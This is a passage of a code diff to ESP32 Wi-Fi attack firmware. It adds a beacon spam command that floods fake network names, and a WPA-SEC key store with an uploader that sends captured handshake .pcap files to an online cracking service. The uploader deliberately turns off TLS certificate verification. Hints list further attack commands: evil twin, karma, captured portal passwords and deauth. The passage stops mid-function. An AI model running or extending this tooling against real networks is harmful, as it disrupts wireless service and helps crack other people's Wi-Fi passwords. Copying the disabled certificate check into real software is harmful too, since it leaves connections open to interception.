+static bool wpasec_save_key_to_nvs(const char *key) {
+    nvs_handle_t handle;
+    esp_err_t err = nvs_open(WPASEC_NVS_NAMESPACE, NVS_READWRITE, &handle);
+    if (err != ESP_OK) {
+        return false;
+    }
+
+    err = nvs_set_str(handle, WPASEC_NVS_KEY, key);
+    if (err == ESP_OK) {
+        err = nvs_commit(handle);
+    }
+    nvs_close(handle);
+    return err == ESP_OK;
+}
+
+// ---------------------------------------------------
+
+static void ota_mark_valid_if_pending(void) {
+    const esp_partition_t *running = esp_ota_get_running_partition();
+    if (!running) {
+        return;
+    }
+
+    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;
+    esp_err_t err = esp_ota_get_state_partition(running, &state);
+    if (err != ESP_OK) {
+        return;
+    }
+
+    if (state == ESP_OTA_IMG_PENDING_VERIFY) {
+        MY_LOG_INFO(TAG, "OTA: pending verify on %s, marking app valid", running->label);
+        err = esp_ota_mark_app_valid_cancel_rollback();
+        if (err != ESP_OK) {
+            MY_LOG_INFO(TAG, "OTA: mark valid failed: %s", esp_err_to_name(err));
+        } else {
+            MY_LOG_INFO(TAG, "OTA: app marked valid");
+        }
+    } else {
+        MY_LOG_INFO(TAG, "OTA: running state=%d, no mark needed", (int)state);
+    }
+}
+
+static void ota_log_boot_info(void) {
+    const esp_partition_t *boot = esp_ota_get_boot_partition();
+    const esp_partition_t *running = esp_ota_get_running_partition();
+    const esp_partition_t *next = esp_ota_get_next_update_partition(NULL);
+    const esp_partition_t *invalid = esp_ota_get_last_invalid_partition();
+    esp_ota_img_states_t state = ESP_OTA_IMG_UNDEFINED;
+
+    if (running) {
+        esp_err_t err = esp_ota_get_state_partition(running, &state);
+        if (err != ESP_OK) {
+            state = ESP_OTA_IMG_UNDEFINED;
+        }
+    }
+
+    MY_LOG_INFO(TAG, "OTA: boot partition=%s offset=0x%lx",
+                boot ? boot->label : "n/a",
+                boot ? (unsigned long)boot->address : 0UL);
+    MY_LOG_INFO(TAG, "OTA: running partition=%s offset=0x%lx state=%d",
+                running ? running->label : "n/a",
+                running ? (unsigned long)running->address : 0UL,
+                (int)state);
+    MY_LOG_INFO(TAG, "OTA: next update partition=%s offset=0x%lx",
+                next ? next->label : "n/a",
+                next ? (unsigned long)next->address : 0UL);
+    if (invalid) {
+        MY_LOG_INFO(TAG, "OTA: last invalid partition=%s offset=0x%lx",
+                    invalid->label,
+                    (unsigned long)invalid->address);
+        MY_LOG_INFO(TAG, "OTA: rollback detected (booted from %s)",
+                    running ? running->label : "n/a");
+    }
+}
+
 // --- Wi-Fi initialization (STA only - uses less memory) ---
 // AP mode will be enabled dynamically when needed (Evil Twin, Portal)
 static esp_err_t wifi_init_ap_sta(void) {
@@ -1405,6 +2315,14 @@ static esp_err_t wifi_init_ap_sta(void) {
                                                             NULL,
                                                             NULL));
         wifi_event_handler_registered = true;
+    }
+    if (!ip_event_handler_registered) {
+        ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
+                                                            IP_EVENT_STA_GOT_IP,
+                                                            &ip_event_handler,
+                                                            NULL,
+                                                            NULL));
+        ip_event_handler_registered = true;
     }
 
     wifi_config_t wifi_config = { 0 };
@@ -3172,6 +4090,315 @@ static int cmd_save_handshake(int argc, char **argv) {
     }
 }
 
+// --------------- WPA-SEC commands ---------------
+
+static int cmd_wpasec_key(int argc, char **argv) {
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: wpasec_key set <key> | wpasec_key read");
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "read") == 0) {
+        if (wpasec_api_key[0] == '\0') {
+            MY_LOG_INFO(TAG, "WPA-SEC key: not set");
+            MY_LOG_INFO(TAG, "Get your key at: https://wpa-sec.stanev.org/?get_key");
+        } else {
+            // Show first 4 chars, mask the rest
+            MY_LOG_INFO(TAG, "WPA-SEC key: %.4s****", wpasec_api_key);
+        }
+        return 0;
+    }
+
+    if (strcasecmp(argv[1], "set") == 0) {
+        if (argc < 3) {
+            MY_LOG_INFO(TAG, "Usage: wpasec_key set <key>");
+            MY_LOG_INFO(TAG, "Get your key at: https://wpa-sec.stanev.org/?get_key");
+            return 0;
+        }
+        const char *key = argv[2];
+        if (strlen(key) == 0 || strlen(key) >= WPASEC_KEY_MAX_LEN) {
+            MY_LOG_INFO(TAG, "Invalid key length (max %d chars)", WPASEC_KEY_MAX_LEN - 1);
+            return 1;
+        }
+        if (wpasec_save_key_to_nvs(key)) {
+            strncpy(wpasec_api_key, key, sizeof(wpasec_api_key) - 1);
+            wpasec_api_key[sizeof(wpasec_api_key) - 1] = '\0';
+            MY_LOG_INFO(TAG, "WPA-SEC key saved: %.4s****", wpasec_api_key);
+        } else {
+            MY_LOG_INFO(TAG, "Failed to save WPA-SEC key to NVS");
+            return 1;
+        }
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Usage: wpasec_key set <key> | wpasec_key read");
+    return 0;
+}
+
+/**
+ * @brief Write all data to esp_tls, handling partial writes
+ */
+static int wpasec_tls_write_all(esp_tls_t *tls, const char *buf, int len) {
+    int written = 0;
+    while (written < len) {
+        int ret = esp_tls_conn_write(tls, buf + written, len - written);
+        if (ret < 0) {
+            return ret;
+        }
+        written += ret;
+    }
+    return written;
+}
+
+/**
+ * @brief Upload a single .pcap file to wpa-sec.stanev.org
+ *
+ * Uses esp_tls directly (not esp_http_client) for full control over
+ * TLS settings, specifically to skip server certificate verification.
+ *
+ * @param filepath  Full path to .pcap file on SD card
+ * @param filename  Just the filename (for the Content-Disposition header)
+ * @return 0 on success, 1 on duplicate ("already submitted"), -1 on error
+ */
+static int wpasec_upload_file(const char *filepath, const char *filename) {
+    // Read file into memory
+    FILE *f = fopen(filepath, "rb");
+    if (!f) {
+        MY_LOG_INFO(TAG, "  Failed to open: %s", filepath);
+        return -1;
+    }
+
+    fseek(f, 0, SEEK_END);
+    long file_size = ftell(f);
+    fseek(f, 0, SEEK_SET);
+
+    if (file_size <= 0 || file_size > 512 * 1024) {
+        MY_LOG_INFO(TAG, "  Invalid file size: %ld bytes", file_size);
+        fclose(f);
+        return -1;
+    }
+
+    // Prefer PSRAM for file buffer
+    uint8_t *file_buf = NULL;
+    if (heap_caps_get_free_size(MALLOC_CAP_SPIRAM) > (size_t)file_size + 1024) {
+        file_buf = (uint8_t *)heap_caps_malloc((size_t)file_size, MALLOC_CAP_SPIRAM);
+    }
+    if (!file_buf) {
+        file_buf = (uint8_t *)malloc((size_t)file_size);
+    }
+    if (!file_buf) {
+        MY_LOG_INFO(TAG, "  Memory allocation failed (%ld bytes)", file_size);
+        fclose(f);
+        return -1;
+    }
+
+    size_t bytes_read = fread(file_buf, 1, (size_t)file_size, f);
+    fclose(f);
+
+    if (bytes_read != (size_t)file_size) {
+        MY_LOG_INFO(TAG, "  Read error: got %zu of %ld bytes", bytes_read, file_size);
+        free(file_buf);
+        return -1;
+    }
+
+    // Build multipart body parts
+    char boundary[32];
+    snprintf(boundary, sizeof(boundary), "----WpaSec%lu", (unsigned long)(esp_timer_get_time() / 1000));
+
+    char body_start[256];
+    int start_len = snprintf(body_start, sizeof(body_start),
+        "--%s\r\n"
+        "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n"
+        "Content-Type: application/octet-stream\r\n\r\n",
+        boundary, filename);
+
+    char body_end[48];
+    int end_len = snprintf(body_end, sizeof(body_end), "\r\n--%s--\r\n", boundary);
+
+    int body_total_len = start_len + (int)file_size + end_len;
+
+    // Build HTTP request headers
+    char http_headers[512];
+    int hdr_len = snprintf(http_headers, sizeof(http_headers),
+        "POST / HTTP/1.1\r\n"
+        "Host: wpa-sec.stanev.org\r\n"
+        "Cookie: key=%s\r\n"
+        "Content-Type: multipart/form-data; boundary=%s\r\n"
+        "Content-Length: %d\r\n"
+        "User-Agent: projectZero-wpasec\r\n"
+        "Connection: close\r\n"
+        "\r\n",
+        wpasec_api_key, boundary, body_total_len);
+
+    // Open TLS connection - skip server cert verification (insecure, like reference code)
+    esp_tls_cfg_t tls_cfg = {
+        .crt_bundle_attach = NULL,  // Skip certificate verification in ESP-IDF v6.0
+        .timeout_ms = 15000,
+    };
+
+    esp_tls_t *tls = esp_tls_init();
+    if (!tls) {
+        MY_LOG_INFO(TAG, "  TLS init failed");
+        free(file_buf);
+        return -1;
+    }
+
+    int ret = esp_tls_conn_http_new_sync(WPASEC_URL, &tls_cfg, tls);
+    if (ret < 0) {
+        MY_LOG_INFO(TAG, "  TLS connection failed");
+        esp_tls_conn_destroy(tls);
+        free(file_buf);
+        return -1;
+    }
+
+    // Send HTTP headers
+    if (wpasec_tls_write_all(tls, http_headers, hdr_len) < 0) {
+        MY_LOG_INFO(TAG, "  Failed to send HTTP headers");
+        esp_tls_conn_destroy(tls);
+        free(file_buf);
+        return -1;
+    }
+
+    // Send multipart body: start boundary + file data + end boundary
+    int write_ok = 1;
+    if (wpasec_tls_write_all(tls, body_start, start_len) < 0) write_ok = 0;
+    if (write_ok && wpasec_tls_write_all(tls, (const char *)file_buf, (int)file_size) < 0) write_ok = 0;
+    if (write_ok && wpasec_tls_write_all(tls, body_end, end_len) < 0) write_ok = 0;
+    free(file_buf);
+
+    if (!write_ok) {
+        MY_LOG_INFO(TAG, "  Failed to send body");
+        esp_tls_conn_destroy(tls);
+        return -1;
+    }
+
+    // Read response
+    char resp_buf[512] = {0};
+    int total_read = 0;
+    while (total_read < (int)sizeof(resp_buf) - 1) {
+        ret = esp_tls_conn_read(tls, resp_buf + total_read, sizeof(resp_buf) - 1 - total_read);
+        if (ret <= 0) break;
+        total_read += ret;
+    }
+    resp_buf[total_read] = '\0';
+
+    esp_tls_conn_destroy(tls);
+
+    // Parse HTTP status code from response (e.g. "HTTP/1.1 200 OK")
+    int status = 0;
+    if (total_read > 12 && strncmp(resp_buf, "HTTP/", 5) == 0) {
+        const char *sp = strchr(resp_buf, ' ');
+        if (sp) status = atoi(sp + 1);
+    }
+
+    if (status == 200) {
+        if (strstr(resp_buf, "already submitted") != NULL) {
+            return 1; // duplicate
+        }
+        return 0; // success
+    } else {
+        MY_LOG_INFO(TAG, "  HTTP error %d", status);
+        return -1;
+    }
+}
+
+static int cmd_wpasec_upload(int argc, char **argv) {
+    (void)argc; (void)argv;
+
+    // 1. Check WiFi STA is connected
+    wifi_ap_record_t ap_info;
+    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
+        return 1;
+    }
+
+    // 2. Check API key
+    if (wpasec_api_key[0] == '\0') {
+        MY_LOG_INFO(TAG, "No WPA-SEC API key set. Use 'wpasec_key set <key>' first.");
+        MY_LOG_INFO(TAG, "Get your key at: https://wpa-sec.stanev.org/?get_key");
+        return 1;
+    }
+
+    // 3. Init SD card and open handshakes directory
+    esp_err_t ret = init_sd_card();
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to initialize SD card: %s", esp_err_to_name(ret));
+        return 1;
+    }
+
+    DIR *dir = opendir("/sdcard/lab/handshakes");
+    if (dir == NULL) {
+        MY_LOG_INFO(TAG, "Failed to open /sdcard/lab/handshakes directory");
+        return 1;
+    }
+
+    // Count .pcap files first
+    struct dirent *entry;
+    int total_files = 0;
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) continue;
+        size_t nlen = strlen(entry->d_name);
+        if (nlen > 5 && strcasecmp(entry->d_name + nlen - 5, ".pcap") == 0) {
+            total_files++;
+        }
+    }
+
+    if (total_files == 0) {
+        MY_LOG_INFO(TAG, "No .pcap files found in /sdcard/lab/handshakes/");
+        closedir(dir);
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Uploading %d handshake(s) to wpa-sec.stanev.org...", total_files);
+
+    // Rewind and process
+    rewinddir(dir);
+    int current = 0;
+    int uploaded = 0;
+    int duplicates = 0;
+    int failed = 0;
+
+    while ((entry = readdir(dir)) != NULL) {
+        if (entry->d_type == DT_DIR) continue;
+        size_t nlen = strlen(entry->d_name);
+        if (nlen <= 5 || strcasecmp(entry->d_name + nlen - 5, ".pcap") != 0) continue;
+
+        current++;
+        char filepath[280];
+        snprintf(filepath, sizeof(filepath), "/sdcard/lab/handshakes/%s", entry->d_name);
+
+        // Get file size for display
+        struct stat st;
+        long fsize = 0;
+        if (stat(filepath, &st) == 0) {
+            fsize = (long)st.st_size;
+        }
+
+        int result = wpasec_upload_file(filepath, entry->d_name);
+
+        if (result == 0) {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> OK", current, total_files, entry->d_name, fsize);
+            uploaded++;
+        } else if (result == 1) {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> already submitted", current, total_files, entry->d_name, fsize);
+            duplicates++;
+        } else {
+            MY_LOG_INFO(TAG, "[%d/%d] %s (%ld bytes) -> FAILED", current, total_files, entry->d_name, fsize);
+            failed++;
+        }
+
+        // Small delay between uploads to let WiFi stack settle
+        vTaskDelay(pdMS_TO_TICKS(500));
+    }
+
+    closedir(dir);
+
+    MY_LOG_INFO(TAG, "Done: %d uploaded, %d duplicate, %d failed", uploaded, duplicates, failed);
+    return (failed > 0) ? 1 : 0;
+}
+
+// -------------------------------------------------
+
 static int cmd_start_sae_overflow(int argc, char **argv) {
     //avoid compiler warnings:
     (void)argc; (void)argv;
@@ -3602,6 +4829,130 @@ static int cmd_start_evil_twin(int argc, char **argv) {
     return 0;
 }
 
+/**
+ * CLI command: start_beacon_spam "SSID1" "SSID2" ...
+ * Starts beacon spam attack with multiple fake SSIDs
+ */
+static int cmd_start_beacon_spam(int argc, char **argv) {
+    if (argc < 2) {
+        MY_LOG_INFO(TAG, "Usage: start_beacon_spam \"SSID1\" \"SSID2\" ...");
+        return 1;
+    }
+
+    // Check if already running
+    if (beacon_spam_active || beacon_spam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Beacon spam already running. Use 'stop' first.");
+        return 1;
+    }
+
+    // Parse SSIDs from arguments
+    beacon_ssid_count = 0;
+    for (int i = 1; i < argc && beacon_ssid_count < MAX_BEACON_SSIDS; i++) {
+        int len = strlen(argv[i]);
+        if (len > 0 && len <= 32) {
+            strncpy(beacon_ssids[beacon_ssid_count], argv[i], 32);
+            beacon_ssids[beacon_ssid_count][32] = '\0';
+            beacon_ssid_count++;
+        } else {
+            MY_LOG_INFO(TAG, "Warning: SSID %d invalid length (%d), skipping", i, len);
+        }
+    }
+
+    if (beacon_ssid_count == 0) {
+        MY_LOG_INFO(TAG, "No valid SSIDs provided");
+        return 1;
+    }
+
+    MY_LOG_INFO(TAG, "Starting beacon spam with %d SSIDs:", beacon_ssid_count);
+    for (int i = 0; i < beacon_ssid_count; i++) {
+        MY_LOG_INFO(TAG, "  %d: %s", i + 1, beacon_ssids[i]);
+    }
+
+    // Deinitialize BLE if active
+    if (nimble_initialized) {
+        MY_LOG_INFO(TAG, "Deinitializing BLE...");
+        bt_nimble_deinit();
+        vTaskDelay(pdMS_TO_TICKS(200));
+    }
+
+    // Ensure WiFi is initialized
+    if (!wifi_initialized) {
+        MY_LOG_INFO(TAG, "Initializing WiFi...");
+        esp_err_t err = wifi_init_ap_sta();
+        if (err != ESP_OK) {
+            MY_LOG_INFO(TAG, "WiFi initialization failed: %s", esp_err_to_name(err));
+            return 1;
+        }
+    }
+
+    // Stop WiFi and reconfigure for AP mode
+    esp_wifi_stop();
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    // Set to APSTA mode
+    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_APSTA);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set APSTA mode: %s", esp_err_to_name(err));
+        return 1;
+    }
+
+    // Hide the default AP SSID (avoid ESP_[MAC] showing up)
+    wifi_config_t ap_config = {
+        .ap = {
+            .ssid = "",
+            .ssid_len = 0,
+            .ssid_hidden = 1,
+            .password = "",
+            .max_connection = 0,
+            .authmode = WIFI_AUTH_OPEN
+        },
+    };
+    esp_err_t ap_err = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    if (ap_err != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set hidden AP config: %s", esp_err_to_name(ap_err));
+    }
+
+    // Start WiFi
+    err = esp_wifi_start();
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start WiFi: %s", esp_err_to_name(err));
+        return 1;
+    }
+
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    // Set initial channel to 1 (task will hop through all channels)
+    err = esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+    if (err != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set channel 1: %s", esp_err_to_name(err));
+    }
+
+    MY_LOG_INFO(TAG, "WiFi configured for beacon spam on channels 1-13");
+
+    // Start beacon spam task
+    beacon_spam_active = true;
+    operation_stop_requested = false;
+
+    BaseType_t result = xTaskCreate(
+        beacon_spam_task,
+        "beacon_spam",
+        4096,
+        NULL,
+        5,
+        &beacon_spam_task_handle
+    );
+
+    if (result != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create beacon spam task");
+        beacon_spam_active = false;
+        beacon_spam_task_handle = NULL;
+        return 1;
+    }
+
+    MY_LOG_INFO(TAG, "Beacon spam started. Use 'stop' to end.");
+    return 0;
+}
+
 static int cmd_stop(int argc, char **argv) {
     (void)argc; (void)argv;
     MY_LOG_INFO(TAG, "Stop command received - stopping all operations...");
@@ -3706,6 +5057,28 @@ static int cmd_stop(int argc, char **argv) {
         // Clear target BSSIDs
         target_bssid_count = 0;
         memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
+    }
+    
+    // Stop beacon spam task if running
+    if (beacon_spam_active || beacon_spam_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping beacon spam task...");
+        beacon_spam_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && beacon_spam_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (beacon_spam_task_handle != NULL) {
+            vTaskDelete(beacon_spam_task_handle);
+            beacon_spam_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Beacon spam task forcefully stopped.");
+        }
+        
+        // Clear beacon SSIDs
+        beacon_ssid_count = 0;
+        memset(beacon_ssids, 0, sizeof(beacon_ssids));
     }
     
     // Stop any active attacks
@@ -3979,14 +5352,300 @@ static int cmd_stop(int argc, char **argv) {
     return 0;
 }
 
+static bool parse_ipv4_arg(const char *arg, esp_ip4_addr_t *out) {
+    if (!arg || !out) {
+        return false;
+    }
+    ip4_addr_t tmp = { 0 };
+    if (ip4addr_aton(arg, &tmp) == 0) {
+        return false;
+    }
+    out->addr = tmp.addr;
+    return true;
+}
+
+static bool line_ends_with_space(const char *line) {
+    if (!line) {
+        return false;
+    }
+    size_t len = strlen(line);
+    if (len == 0) {
+        return false;
+    }
+    char last = line[len - 1];
+    return last == ' ' || last == '\t';
+}
+
+typedef struct {
+    const char *command;
+    const char *hint;
+} cli_hint_t;
+
+static const cli_hint_t k_cli_hints[] = {
+    { "packet_monitor", " <channel>" },
+    { "deauth_detector", " [index1 index2 ...]" },
+    { "select_networks", " <index1> [index2] ..." },
+    { "select_stations", " <MAC1> [MAC2] ..." },
+    { "sniffer_debug", " <0|1>" },
+    { "start_gps_raw", " [baud]" },
+    { "gps_set", " <m5|atgm>" },
+    { "start_portal", " <SSID>" },
+    { "start_karma", " <index>" },
+    { "vendor", " set <on|off> | read" },
+    { "boot_button", " read|list|set <short|long> <command> | status <short|long> <on|off>" },
+    { "led", " set <on|off> | level <1-100> | read" },
+    { "channel_time", " set <min|max> <ms> | read <min|max>" },
+    { "wifi_connect", " <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]" },
+    { "ota_channel", " [main|dev]" },
+    { "ota_boot", " <ota_0|ota_1>" },
+    { "arp_ban", " <MAC> [IP]" },
+    { "show_pass", " [portal|evil]" },
+    { "list_dir", " [path]" },
+    { "file_delete", " <path>" },
+    { "select_html", " <index>" },
+    { "set_html", " <html>" },
+    { "wpasec_key", " set <key> | read" },
+    { "wpasec_upload", "" },
+};
+
+static const char *lookup_cli_hint(const char *command) {
+    if (!command) {
+        return NULL;
+    }
+    for (size_t i = 0; i < (sizeof(k_cli_hints) / sizeof(k_cli_hints[0])); i++) {
+        if (strcmp(k_cli_hints[i].command, command) == 0) {
+            return k_cli_hints[i].hint;
+        }
+    }
+    return NULL;
+}
+
+static const char *wifi_connect_dynamic_hint(const char *buf, int *color, int *bold) {
+    static const char *hint_ssid = " <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
+    static const char *hint_pass = " <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
+    static const char *hint_optional = " [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
+    static const char *hint_ip_optional = " [<IP> <Netmask> <GW> [DNS1] [DNS2]]";
+    static const char *hint_mask = " <Netmask> <GW> [DNS1] [DNS2]";
+    static const char *hint_gw = " <GW> [DNS1] [DNS2]";
+    static const char *hint_dns1 = " [DNS1] [DNS2]";
+    static const char *hint_dns2 = " [DNS2]";
+
+    if (!buf) {
+        return NULL;
+    }
+    if (color) {
+        *color = 39;
+    }
+    if (bold) {
+        *bold = 0;
+    }
+
+    char line[128];
+    size_t len = strnlen(buf, sizeof(line) - 1);
+    memcpy(line, buf, len);
+    line[len] = '\0';
+
+    char *argv[10];
+    size_t argc = esp_console_split_argv(line, argv, sizeof(argv) / sizeof(argv[0]));
+    if (argc == 0) {
+        return NULL;
+    }
+    if (strcmp(argv[0], "wifi_connect") != 0) {
+        return NULL;
+    }
+
+    if (argc == 1) {
+        return hint_ssid;
+    }
+
+    if (!line_ends_with_space(buf)) {
+        return NULL;
+    }
+
+    if (argc == 2) {
+        return hint_pass;
+    }
+    if (argc == 3) {
+        return hint_optional;
+    }
+
+    bool has_ota = (strcasecmp(argv[3], "ota") == 0);
+    int ip_start = has_ota ? 4 : 3;
+    int ip_args = (int)argc - ip_start;
+
+    if (ip_args <= 0) {
+        return hint_ip_optional;
+    }
+    if (ip_args == 1) {
+        return hint_mask;
+    }
+    if (ip_args == 2) {
+        return hint_gw;
+    }
+    if (ip_args == 3) {
+        return hint_dns1;
+    }
+    if (ip_args == 4) {
+        return hint_dns2;
+    }
+
+    return NULL;
+}
+
+static const char *generic_cli_hint(const char *buf, int *color, int *bold) {
+    if (!buf) {
+        return NULL;
+    }
+
+    char line[128];
+    size_t len = strnlen(buf, sizeof(line) - 1);
+    memcpy(line, buf, len);
+    line[len] = '\0';
+
+    char *argv[10];
+    size_t argc = esp_console_split_argv(line, argv, sizeof(argv) / sizeof(argv[0]));
+    if (argc == 0) {
+        return NULL;
+    }
+
+    if (strcmp(argv[0], "wifi_connect") == 0) {
+        return NULL;
+    }
+
+    if (argc != 1 && !line_ends_with_space(buf)) {
+        return NULL;
+    }
+
+    const char *hint = esp_console_get_hint(argv[0], color, bold);
+    if (hint) {
+        return hint;
+    }
+
+    hint = lookup_cli_hint(argv[0]);
+    if (hint && hint[0] != '\0') {
+        if (color) {
+            *color = 39;
+        }
+        if (bold) {
+            *bold = 0;
+        }
+        return hint;
+    }
+
+    return NULL;
+}
+
+static char *janos_console_hint(const char *buf, int *color, int *bold) {
+    const char *hint = wifi_connect_dynamic_hint(buf, color, bold);
+    if (hint != NULL) {
+        return (char *)hint;
+    }
+    hint = generic_cli_hint(buf, color, bold);
+    if (hint != NULL) {
+        return (char *)hint;
+    }
+    return (char *)esp_console_get_hint(buf, color, bold);
+}
+
+static bool wait_for_sta_ip_info(esp_netif_ip_info_t *out_info, int timeout_ms) {
+    if (!out_info) {
+        return false;
+    }
+
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        return false;
+    }
+
+    if (esp_netif_get_ip_info(sta_netif, out_info) == ESP_OK && out_info->ip.addr != 0) {
+        return true;
+    }
+
+    int loops = timeout_ms / 100;
+    for (int i = 0; i < loops; i++) {
+        vTaskDelay(pdMS_TO_TICKS(100));
+        if (esp_netif_get_ip_info(sta_netif, out_info) == ESP_OK && out_info->ip.addr != 0) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+static int cmd_wifi_disconnect(int argc, char **argv) {
+    if (argc != 1) {
+        MY_LOG_INFO(TAG, "Usage: wifi_disconnect");
+        return 0;
+    }
+
+    if (current_radio_mode != RADIO_MODE_WIFI || !wifi_initialized) {
+        MY_LOG_INFO(TAG, "WiFi not initialized");
+        return 0;
+    }
+
+    wifi_ap_record_t ap_info;
+    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
+        MY_LOG_INFO(TAG, "Not connected to any AP.");
+        return 0;
+    }
+
+    MY_LOG_INFO(TAG, "Disconnecting from AP '%s'...", ap_info.ssid);
+    esp_wifi_disconnect();
+    return 0;
+}
+
 static int cmd_wifi_connect(int argc, char **argv) {
-    if (argc < 3) {
-        MY_LOG_INFO(TAG, "Usage: wifi_connect <SSID> <Password>");
-        return 1;
+    if (argc < 3 || argc > 9) {
+        MY_LOG_INFO(TAG, "Usage: wifi_connect <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
+        return 0;
     }
     
     const char *ssid = argv[1];
     const char *password = argv[2];
+    bool ota_after_connect = false;
+    bool use_static_ip = false;
+    esp_ip4_addr_t static_ip = { 0 };
+    esp_ip4_addr_t static_mask = { 0 };
+    esp_ip4_addr_t static_gw = { 0 };
+    bool use_dns1 = false;
+    bool use_dns2 = false;
+    esp_ip4_addr_t static_dns1 = { 0 };
+    esp_ip4_addr_t static_dns2 = { 0 };
+
+    int argi = 3;
+    if (argc > argi && strcasecmp(argv[argi], "ota") == 0) {
+        ota_after_connect = true;
+        argi++;
+    }
+
+    int remaining = argc - argi;
+    if (remaining != 0 && remaining != 3 && remaining != 4 && remaining != 5) {
+        MY_LOG_INFO(TAG, "Usage: wifi_connect <SSID> <Password> [ota] [<IP> <Netmask> <GW> [DNS1] [DNS2]]");
+        return 0;
+    }
+    if (remaining >= 3) {
+        if (!parse_ipv4_arg(argv[argi], &static_ip) ||
+            !parse_ipv4_arg(argv[argi + 1], &static_mask) ||
+            !parse_ipv4_arg(argv[argi + 2], &static_gw)) {
+            MY_LOG_INFO(TAG, "Invalid IP/netmask/gateway. Example: 192.168.1.10 255.255.255.0 192.168.1.1");
+            return 0;
+        }
+        use_static_ip = true;
+    }
+    if (remaining >= 4) {
+        if (!parse_ipv4_arg(argv[argi + 3], &static_dns1)) {
+            MY_LOG_INFO(TAG, "Invalid DNS1. Example: 8.8.8.8");
+            return 0;
+        }
+        use_dns1 = true;
+    }
+    if (remaining == 5) {
+        if (!parse_ipv4_arg(argv[argi + 4], &static_dns2)) {
+            MY_LOG_INFO(TAG, "Invalid DNS2. Example: 1.1.1.1");
+            return 0;
+        }
+        use_dns2 = true;
+    }
     
     MY_LOG_INFO(TAG, "Connecting to AP '%s'...", ssid);
     
@@ -4008,9 +5667,48 @@ static int cmd_wifi_connect(int argc, char **argv) {
     // Reinitialize WiFi
     if (!ensure_wifi_mode()) {
         MY_LOG_INFO(TAG, "Failed to reinitialize WiFi");
-        return 1;
+        return 0;
     }
     
+    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
+    if (!sta_netif) {
+        MY_LOG_INFO(TAG, "STA interface not found");
+        return 0;
+    }
+
+    if (use_static_ip) {
+        esp_netif_dhcpc_stop(sta_netif);
+        esp_netif_ip_info_t ip_info = { 0 };
+        ip_info.ip = static_ip;
+        ip_info.netmask = static_mask;
+        ip_info.gw = static_gw;
+        esp_err_t ret = esp_netif_set_ip_info(sta_netif, &ip_info);
+        if (ret != ESP_OK) {
+            MY_LOG_INFO(TAG, "Failed to set static IP: %s", esp_err_to_name(ret));
+            return 0;
+        }
+        if (use_dns1) {
+            esp_netif_dns_info_t dns = { 0 };
+            dns.ip.u_addr.ip4 = static_dns1;
+            dns.ip.type = IPADDR_TYPE_V4;
+            ret = esp_netif_set_dns_info(sta_netif, ESP_NETIF_DNS_MAIN, &dns);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to set DNS1: %s", esp_err_to_name(ret));
+            }
+        }
+        if (use_dns2) {
+            esp_netif_dns_info_t dns = { 0 };
+            dns.ip.u_addr.ip4 = static_dns2;
+            dns.ip.type = IPADDR_TYPE_V4;
+            ret = esp_netif_set_dns_info(sta_netif, ESP_NETIF_DNS_BACKUP, &dns);
+            if (ret != ESP_OK) {
+                MY_LOG_INFO(TAG, "Failed to set DNS2: %s", esp_err_to_name(ret));
+            }
+        }
+    } else {
+        esp_netif_dhcpc_start(sta_netif);
+    }
+
     // Configure STA and connect
     wifi_config_t sta_config = { 0 };
     strncpy((char *)sta_config.sta.ssid, ssid, sizeof(sta_config.sta.ssid) - 1);
@@ -4030,15 +5728,279 @@ static int cmd_wifi_connect(int argc, char **argv) {
     }
     
     if (wifi_connect_result == 1) {
+        esp_netif_ip_info_t ip_info = { 0 };
+        bool has_ip = wait_for_sta_ip_info(&ip_info, 5000);
         MY_LOG_INFO(TAG, "SUCCESS: Connected to '%s'", ssid);
+        if (has_ip) {
+            if (use_static_ip) {
+                MY_LOG_INFO(TAG, "Static IP: " IPSTR ", Netmask: " IPSTR ", GW: " IPSTR,
+                            IP2STR(&ip_info.ip), IP2STR(&ip_info.netmask), IP2STR(&ip_info.gw));
+                if (use_dns1) {
+                    MY_LOG_INFO(TAG, "DNS1: " IPSTR, IP2STR(&static_dns1));
+                }
+                if (use_dns2) {
